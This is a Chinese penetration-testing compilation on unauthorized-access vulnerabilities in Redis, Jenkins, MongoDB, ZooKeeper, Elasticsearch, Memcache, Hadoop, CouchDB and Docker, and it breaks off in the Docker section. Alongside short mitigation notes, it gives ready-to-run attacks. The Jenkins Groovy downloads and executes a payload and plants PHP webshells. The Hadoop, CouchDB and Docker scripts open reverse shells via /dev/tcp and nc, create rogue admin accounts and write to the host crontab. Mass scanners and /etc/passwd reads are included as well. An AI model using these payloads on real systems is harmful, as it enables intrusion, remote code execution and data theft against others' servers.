# 前言

首发先知:[https://xz.aliyun.com/t/2320](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

知识那么多,大佬们学慢点,我营养跟不上啦! 前人栽树后人乘凉,本文主要是把一些资料依葫芦画瓢学习了下,做了个汇总.



---

# 0×00 小二上酒

[https://github.com/se55i0n/DBScanner](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

> a\)Redis未授权访问  
> b\)Jenkins未授权访问  
> c\)MongoDB未授权访问  
> d\)ZooKeeper未授权访问  
> e\)Elasticsearch未授权访问  
> f\)Memcache未授权访问  
> g\)Hadoop未授权访问  
> h\)CouchDB未授权访问  
> i\)Docker未授权访问



---

# 0×01 Redis未授权访问（查看另一篇）

## 1.扫描探测

\(1\). 测试时建议 vim /etc/redis.conf

```
（1）cp redis.conf ./src/redis.conf
（2）bind 127.0.0.1前面加上#号注释掉 或者更改成 0.0.0.0
（3）protected-mode设为no
（4）启动redis-server  ------>   ./src/redis-server redis.conf
```

\(2\). 攻击者喜欢的命令

```
（1）查看信息：info
（2）删除所有数据库内容：flushall
（3）刷新数据库：flushdb
（4）看所有键：KEYS *，使用select num可以查看键值数据。
（5）设置变量：set test "who am i"
（6）config set dir dirpath 设置路径等配置
（7）config get dir/dbfilename 获取路径及数据配置信息
（8）save保存
（9）get 变量，查看变量名称
```

# 0×02 Jenkins未授权访问

  
1.扫描探测

弱口令扫描:[https://github.com/blackye/Jenkins](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef) 或者 [https://github.com/blackye/Jenkins](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

From: [https://www.secpulse.com/archives/2166.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

CVE-2017-1000353:[https://blogs.securiteam.com/index.php/archives/3171](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

提示: script/manage 是管理页面

![](/assets/wsq1.png)



## 2. 攻击利用

2.1 反弹shell

```
println "wget http://192.168.3.131:8081/exp -P /tmp/".execute().text
println "chmod +x /tmp/exp".execute().text
println "/tmp/exp".execute().text

```

或者直接通过 Terminal+Plugin

[https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

2.2 写webshell

```
println "wget http://shell.com/shell.txt -P /var/www/html/".execute().text

new File("/var/www/html/shell.php").write('<?php @eval($_POST[shell]);?>');


def webshell = '<?php @eval($_POST[shell]);?>'
new File("/var/www/html/shell.php").write("$webshell");


def execute(cmd) {
def proc = cmd.execute()
proc.waitFor()
}
execute( [ 'bash', '-c', 'echo -n "<?php @eval($" > /var/www/html/shell.php' ] )
execute( [ 'bash', '-c', 'echo "_POST[shell]);?>" >> /var/www/html/shell.php' ] )
//参数-n 不要在最后自动换行
```

2.3 读文件

```
try{

text = new File("/etc/passwd").getText();

out.print text

} catch(Exception e){

}

```

2.4 执行命令

```
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = 'cat /etc/passwd'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

回显注意点

* Result: 0 表示成功写入
* Result: 1 表示目录不存在或者权限不足 写入失败
* Result: 2 表示构造有异常 写入失败
* 
jenkins可以对每个用户分配不同的权限，如Overall/RunScripts或者Job/Configure权限  
某些版本匿名用户可以访问asynchPeople 可爆破密码（通常很多密码跟用户名一样或者是其他弱口令\(top1000\)，尤其是内网）

##  3. 模拟低权限

**省略掉注册并且安装plugin的傻瓜式操作**

默认安装的情况下，匿名用户是没有任何权限的，这里修改配置，让匿名用户只拥有 查看Job、Job Configure 权限

1.点击 管理\(Manage Jenkins\) – Configure Global Security

2.在 添加用户/组\(User/group to add\): 填入当前登录的用户名，然后点击 Add，移到最右侧，点击 ✔️，让用户拥有所有权限

此步非常重要，不然保存后会导致 admin is missing the Overall/Read permission 错误,如下图所示

3.然后访问 [http://127.0.0.1:8080/newJob](http://127.0.0.1:8080/newJob) ,名称填 Test，类型选择 构建一个自由风格的软件项目\(Freestyle project \)后点击 Save,如下图所示代表创建成功



4.新建一个无痕窗口,通过匿名访问看到有配置权限

点击 配置\(Configure\)，在 Build 部分选择 Execute shell

在 Command 中填入要执行的命令

```
id
uname -a 
cat /etc/passwd 
```

5.通过查看 Configure 页面的选项，得知在 构建触发器\(Build Triggers\) 部分可以设置任务 Build 的触发规则，其中有一个 Build periodically，可以通过类似 Crontab 时间规则来触发，这里填入  `*/1 * * * *`即每分钟执行一次 Build，点击 Save

![](/assets/wsq2.png)

6.回到 Job 页面，等待一会，在左侧 Build History 可以看到，每分钟都会执行一次 Build，这里点击查看 Console Output

![](/assets/wsq3.png)

![](/assets/wsq4.png)



匿名用户是没有 Build 权限，即 Job 的页面中是没有 立即构建\(Build Now\) 按钮，所以这里无法通过点击 立即构建 来触发命令的执行。

## 4. 防护措施

* 在Jenkins管理页面添加访问密码。建议您使用由十位以上数字，字母和特殊符号组成的强密码。
* 建议您不要将管理后台开放到互联网上。您可以使用ECS安全组策略设置访问控制，默认策略为拒绝所有通信。您可以根据业务发布情况仅开放\* 需要对外用户提供的服务，并控制好访问源IP。

---

# 0×03 MongoDB未授权访问

MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。

* 使用默认 mongod 命令启动 Mongodb
* 机器可以被公网访问
* 在公网上开放了 Mongodb 端口
* 数据库隐私泄露
* 数据库被清空
* 数据库运行缓慢

##  1. 扫描探测

下载：[http://nmap.org/svn/scripts/mongodb-info.nse](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

`nmap -p 27017 --script mongodb-info <ip>`

```
vim /etc/mongodb.conf
dbpath = /data/
logpath = /var/logs/mongodb.log
#port = 27017
#fork = true
bind_ip = 0.0.0.0

./mongod –config mongodb.conf //启动mongodb加载配置mongodb.conf
```

1.1 基础  
[https://www.jianshu.com/p/8bf26effa737](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[http://www.runoob.com/mongodb/mongodb-tutorial.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[https://itbilu.com/database/mongo/E1tWQz4\_e.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

1.2 批量扫描未授权

```
import socket
import sys
import pymongo

ipcons = []
def Scanner(ip):
    global ipcons
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(0.3)
    try:
        sk.connect((ip,27017))
        ipcons.append(ip)
        sk.close()
    except Exception:
        pass

def ip2num(ip):
    ip=[int(x) for x in ip.split('.')]
    return ip[0] <<24 | ip[1]<<16 | ip[2]<<8 |ip[3]

def num2ip(num):
    return '%s.%s.%s.%s' %( (num & 0xff000000) >>24,
                                (num & 0x00ff0000) >>16,
                                (num & 0x0000ff00) >>8,
                                num & 0x000000ff )

def get_ip(ip):
    start,end = [ip2num(x) for x in ip.split(' ') ]
    return [ num2ip(num) for num in range(start,end+1) if num & 0xff ]

startIp = sys.argv[1]
endIp = sys.argv[2]
iplist = get_ip(sys.argv[1]+" "+sys.argv[2])
for i in iplist:
    Scanner(i)

def connMon(ip_addr):
    print ' Connect mongodb: ' + ip_addr + ':27017'
    try:
        conn = pymongo.MongoClient(ip_addr,27017,socketTimeoutMS=3000)
        dbname = conn.database_names()
        print "success"
    except Exception as e:
        print "error"

print ipcons   
for ipaddr in ipcons:
    connMon(ipaddr)
    print "================="
```

## 2. 爆破脚本

[https://github.com/netxfly/x-crack](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

## 3. 攻击脚本

[https://github.com/youngyangyang04/NoSQLAttack](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[https://www.youtube.com/watch?v=R6-nXCVNxEw](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[https://www.youtube.com/watch?v=R6-nXCVNxEw](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

##  4. 防范措施

\(1\).新建管理账户开启MongoDB授权  
新建终端\[参数默认可以不加，若有自定义参数，才要加上，下同\]  
`mongod --port 27017 --dbpath /data/db1`

另起一个终端，运行下列命令

```
mongo --port 27017

  use admin

  db.createUser(
    {
      user: "adminUser",
      pwd: "adminPass",
      roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
    }
  )


```

管理员创建成功，现在拥有了用户管理员 用户名:adminUser 密码:adminPass

\(2\).本地访问  
bind 127.0.0.1

\(3\).修改默认端口  
修改默认的mongoDB端口\(默认为: TCP 27017\)为其他端口

\(4\).禁用HTTP和REST端口  
MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface = false  
\(5\).开启日志审计功能  
审计功能可以用来记录用户对数据库的所有相关操作。这些记录可以让系统管理员在需要的时候分析数据库在什么时段发生了什么事情  
\(6\).开启auth认证

```
/etc/mongodb.conf　　
auth = 
true
```

其他:[http://www.mottoin.com/105609.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)



---

# 0×04 ZooKeeper未授权访问

From: [http://www.polaris-lab.com/index.php/archives/41/](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[http://www.majunwei.com/category/201612011952003333/](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[http://www.mottoin.com/92742.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[http://cve.scap.org.cn/CVE-2014-0085.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[http://ifeve.com/zookeeper\_guidetozkoperations/](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[http://blog.csdn.net/u011721501/article/details/44062617](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。

## 1.扫描探测

ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。  
`./zkCli.sh -server  127.0.0.1 2181`

```
nmap -sS -p2181 -oG zookeeper.gnmap 192.168.1.0/24  
grep "Ports: 2181/open/tcp" zookeeper.gnmap | cut -f 2 -d ' ' > Live.txt  

```

## 2.攻击获取信息

* stat：列出关于性能和连接的客户端的统计信息。  
  echo stat \|ncat 127.0.0.1 2181

* ruok：测试服务器是否运行在非错误状态。  
  echo ruok \|ncat 127.0.0.1 2181

* reqs：列出未完成的请求。  
  echo reqs \|ncat 127.0.0.1 2181

* envi：打印有关服务环境的详细信息。
  echo envi \|ncat 127.0.0.1 2181

dump：列出未完成的会话和临时节点。  
echo dump \|ncat 127.0.0.1 2181

## 3.防范措施

* 禁止把Zookeeper直接暴露在公网
* 添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）



---

# 0×05 Elasticsearch未授权访问

ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。

## 1.熟悉的响应 You Know, for Search

```
$ curl http://127.0.0.1:9200/_cat/indices/

{ "status" : 200, "name" : "Flake", "cluster_name" : "elasticsearch", "version" : {"number" : "1.4.1"," "build_hash" : "b88f43fc40b0bcd7f173xxxxx2e97816de80b19", "build_timestamp" : "2015-07-29T09:54:16Z", "build_snapshot" : false, "lucene_version" : "4.10.4"}, "tagline" : "You Know, for Search"}
```

## 2.漏洞测试

安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。  
[`http://localhost:9200/_cat/indices`](http://localhost:9200/_cat/indices) 里面的indices包含了\_river一般就是安装了river了。

[http://localhost:9200/\_plugin/head/](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef) web管理界面  
[http://localhost:9200/\_cat/indices](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[http://localhost:9200/\_river/\_search](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef) 查看数据库敏感信息  
[http://localhost:9200/\_nodes](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef) 查看节点数据

```
#! /usr/bin/env python
# _*_  coding:utf-8 _*_

import requests
def Elasticsearch_check(ip, port=9200, timeout=5):
    try:
    　　url = "http://"+ip+":"+str(port)+"/_cat"
    　　response = requests.get(url) 
    except:
    　　pass
    if "/_cat/master" in response.content:
    　　print '[+] Elasticsearch Unauthorized: ' +ip+':'+str(port)

if __name__ == '__main__':
    Elasticsearch_check("127.0.0.1")
```

[https://www.secpulse.com/archives/46394.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

## 3.漏洞修复

\(1\)、默认开启的9200端口和使用的端口不对外公布，或架设内网环境。或者防火墙上设置禁止外网访问9200端口。

```
// accept
# iptables -A INPUT -p tcp -s 127.0.0.1 --dport 9200 -j ACCEPT
# iptables -A INPUT -p udp -s 127.0.0.1 --dport 9200 -j ACCEPT

// drop
# iptables -I INPUT -p tcp --dport 9200 -j DROP
# iptables -I INPUT -p udp --dport 9200 -j DROP

// 保存规则并重启 iptables
# service iptables save
# service iptables restart
```

\(2\)、架设nginx反向代理服务器，并设置http basic认证来实现elasticsearch的登录认证。

[https://www.jianshu.com/p/7ec26c13abbb](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[https://www.sojson.com/blog/213.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

\(3\)、限制IP访问，绑定固定IP

\(4\)、为elasticsearch增加登录验证，可以使用官方推荐的shield插件，该插件为收费插件，可试用30天，免费的可以使用elasticsearch-http-basic，searchguard插件。插件可以通过运行Biplugin install \[github-name\]/repo-name。同时需要注意增加验证后，请勿使用弱口令。 在config/elasticsearch.yml中为9200端口设置认证：

```
http.basic.enabled     true     #开关，开启会接管全部HTTP连接
http.basic.user     "admin"     #账号
http.basic.password     "admin_pw"     #密码
http.basic.ipwhitelist     ["localhost", "127.0.0.1"]     #白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则
http.basic.trusted_proxy_chains     []     #信任代理列表
http.basic.log     false     #把无授权的访问事件添加到ES的日志
http.basic.xforward     ""     #记载代理路径的header字段名
```

[https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[https://blog.csdn.net/u011419453/article/details/39395627](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)



---

# 0×06 Memcache未授权访问

memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。

## 1.扫描探测

```
#! /usr/bin/env python
# _*_  coding:utf-8 _*_
def Memcache_check(ip, port=11211, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send("stats\r\n")
        result = s.recv(1024)
        if "STAT version" in result:
            print '[+] Memcache Unauthorized: ' +ip+':'+str(port)
    except Exception, e:
        pass
if __name__ == '__main__':
    Elasticsearch_check("127.0.0.1") 

```

## 2.攻击利用

2.1 基础部分

通过一个`cheat sheet`了解一下Memcached的协议。Memcached的语法由如下元素组成

* {COMMAND}0×20{ARGUMENT}\(LF\|CRLF\)

command字段有如下几条命令

* 存储操作\(set, add, replace, append, prepend, cas\)
* 检索操作 \(get, gets\)
* 删除操作 \(delete\)
* 增减操作 \(incr, decr\)
* touch
* slabs reassign
* slabs automove
* lru\_crawler
* 统计操作\(stats items, slabs, cachedump\)
* 其他操作 \(version, flush\_all, quit\)

| Command |
| :--- |


|  | 描述 | 实例 |
| :--- | :--- | :--- |
| get | 读某个值 | get mykey |
| set | 强制设置某个键值 | set mykey 0 60 5 |
| add | 添加新键值对 | add newkey 0 60 5 |
| replace | 覆盖已经存在的key | replace key 0 60 5 |
| flush\_all | 让所有条目失效 | flush\_all |
| stats | 打印当前状态 | stats |
| stats malloc | 打印内存状态 | stats malloc |
| version | 打印Memcached版本 | version |

```
stats  //查看memcache 服务状态
stats items  //查看所有items
stats cachedump 32 0  //获得缓存key
get :state:264861539228401373:261588   //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露

```

2.2 建立连接并获取信息

`telnet <target> 11211`，或`nc -vv <target> 11211`，无需用户名密码，可以直接连接memcache 服务的11211端口

![](/assets/wsq5.png)

附赠大佬写的文章 [Discuz!因Memcached未授权访问导致的RCE](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

## 3.防范措施

1.限制访问  
如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为 127.0.0.1。其中 -l 参数指定为本机地址。例如：  
`memcached -d -m 1024 -u root -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid`

或者 vim /etc/sysconfig/memcached，修改配置文件  
`OPTIONS="-l 127.0.0.1"`，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached reload

2.防火墙

```
// accept
# iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT
# iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT

// drop
# iptables -I INPUT -p tcp --dport 11211 -j DROP
# iptables -I INPUT -p udp --dport 11211 -j DROP

// 保存规则并重启 iptables
# service iptables save
# service iptables restart

```

3.使用最小化权限账号运行Memcached服务  
使用普通权限账号运行，指定Memcached用户。  
`memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid`

4.启用认证功能  
Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。[SASL认证详细配置手册](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

5.修改默认端口  
修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：  
`memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid`

6.定期升级

参考:

[http://lzone.de/cheat-sheet/memcached](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[https://www.secpulse.com/archives/49659.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[http://niiconsulting.com/checkmate/2013/05/memcache-exploit/](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[https://xz.aliyun.com/t/2018](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[http://drops.xmd5.com/static/drops/web-8987.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[https://blog.csdn.net/microzone/article/details/79262549](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

---

# 0×07 Hadoop未授权访问

Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理：

* 用户创建一个处理键值的map函数
* 产生了一套中间键/值
* reduce函数合并中间值并把他们关联到对应的键

## 1. 扫描探测

1.1 常见端口

1.2 敏感端口

| 模块 |
| :--- |


|  | 节点 | 默认端口 |
| :--- | :--- | :--- |
| HDFS | NameNode | 50070 |
| HDFS | SecondNameNode | 50090 |
| HDFS | DataNode | 50075 |
| HDFS | Backup/Checkpoint node | 50105 |
| MapReduce | JobTracker | 50030 |
| MapReduce | TaskTracker | 50060 |

通过访问 NameNode WebUI 管理界面的 50070 端口，可以下载任意文件。而且，如果 DataNode 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。

![](/assets/wsq6.png)

## 2. 攻击手法

利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 [REST API](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef) 也可以提交任务执行。

利用过程如下：

* 在本地监听等待反弹 shell 连接
* 调用 New Application API 创建 Application
* 调用 Submit Application API 提交

P牛的攻击脚本

```
#!/usr/bin/env python

import requests

target = 'http://127.0.0.1:8088/'
lhost = '192.168.0.1' # put your local host ip here, and listen at port 9999

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```

![](/assets/wsq7.png)

## 3. 防范措施

1. 网络访问控制  
使用 安全组防火墙 或本地操作系统防火墙对访问源 IP 进行控制。如果您的 Hadoop 环境仅对内网服务器提供服务，建议不要将 Hadoop 服务所有端口发布到互联网。

2. 启用认证功能  
启用 Kerberos 认证功能。

3. 更新补丁  
不定期关注 Hadoop 官方发布的最新版本，并及时更新补丁。



# 0×08 CouchDB未授权访问

## 介绍

CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation \(JSON\) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。  
CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，query\_server在配置文件local.ini中的格式：

```
[query_servers]
LANGUAGE = PATH ARGS
默认情况下，配置文件中已经设置了两个query_servers:

[query_servers]
javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js
coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js
```

可以看到，CouchDB在query\_server中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了

在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query\_server，这个配置项在设计、执行view的时候将被运行。  
[http://bobao.360.cn/learning/detail/4716.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)  
[https://justi.cz/security/2017/11/14/couchdb-rce-npm.html](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

`影响版本：小于 1.7.0 以及 小于 2.1.1`

该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。

## 1.扫描探测

```
nmap -p 5984 –script “couchdb-stats.nse” 127.0.0.1
```

## 2.两个版本的利用方式

\(1\) 1.6.0 下的说明

依次执行如下请求即可触发任意命令执行,其中,vulhub:vulhub为管理员账号密码。

```
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'

```

![](/assets/wsq9.png)

\(2\) 2.1.0 下的说明

2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。  
Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问/\_membership即可：

`curl`[`http://vulhub:vulhub@your-ip:5984/_membership`](http://your-ip:5984/_membership)

可见，我们这里只有一个node，名字是nonode@nohost。

然后，我们修改nonode@nohost的配置：

`curl -X PUT`[`http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd`](http://your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd)`-d '"id >/tmp/success"'`

然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：

```
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'

```

Couchdb 2.x删除了\_temp\_view，所以我们为了触发query\_servers中定义的命令，需要添加一个\_view：

```
curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json"

```

增加\_view的同时即触发了query\_servers中的命令。

2.1 p牛的python脚本 支持高低版本,需要在version = 定义

```
#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth

target = 'http://127.0.0.1:5984'
command = '"bash -i >& /dev/tcp/192.168.2.64/2222 0>&1"'
version = 2

session = requests.session()
session.headers = {
    'Content-Type': 'application/json'
}
# session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
  "type": "user",
  "name": "wooyun",
  "roles": ["_admin"],
  "roles": [],
  "password": "wooyun"
}''')

session.auth = HTTPBasicAuth('wooyun', 'wooyun')

if version == 1:
    session.put(target + ('/_config/query_servers/cmd'), data=command)
else:
    host = session.get(target + '/_membership').json()['all_nodes'][0]
    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command)

session.put(target + '/wooyun')
session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')

if version == 1:
    session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
    session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')


```

2.2 bash自动化脚本

```
#!/bin/bash

echo CouchDB getshell - c0debreak - tools.changesec.com
echo

if [[ $# -ne 2 ]];then
    echo Usage: $0 http://xx.xx.xx.xx:5984 myserver:myport
    exit 1
else
    server=$1
    cb=${2/:/\/}
fi

function run() {
    cmd=$1

    curl -XPUT "$server/_config/query_servers/cmd" -d "\"$cmd\""
    curl -XPUT "$server/example"
    curl -XPUT "$server/example/record" -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
    curl --max-time 1 "$server/example/_temp_view?limit=1" -d '{"language":"cmd", "map":""}' -H 'Content-Type: application/json'
}

run "echo '/bin/bash -i >& /dev/tcp/$cb 0>&1' > /tmp/shell"
run "bash /tmp/shell"
run "rm -f /tmp/shell"

curl -XDELETE "$server/_config/query_servers/cmd"

```

![](/assets/wsq11.png)

## 3. 漏洞修复

1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 `bind_address = 0.0.0.0`，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。

2、设置访问密码 （需要重启CouchDB才能生效） 在 `/etc/couchdb/local.ini`中找到`[admins]`字段配置密码。



---



# 0×09 Docker未授权访问

## 1. 基础介绍

[http://www.loner.fm/drops/\#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。

漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问 [http://host:2375/containers/json](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef) 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。

然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。

## 2. 测试环境配置

先关闭docker，然后开启：

```
sudo service docker stop
sudo docker daemon  -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock 

```

绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。

参考API规范进行渗透：[https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

操作Docker API可以使用python dockert api 完成。

`pip install docker-py`

API使用参考：[https://docker-py.readthedocs.io/en/stable/api/\#client-api](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

## 3. 漏洞复现

3.1 From:phith0n  
利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。

```
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

写入crontab文件，成功反弹shell：

![](/assets/wsq12.png)

3.2 python脚本  
[https://github.com/Tycx2ry/docker\_api\_vul](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

* 安装类库
  pip install -r requirements.txt
* 查看运行的容器
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375
* 查看所有的容器
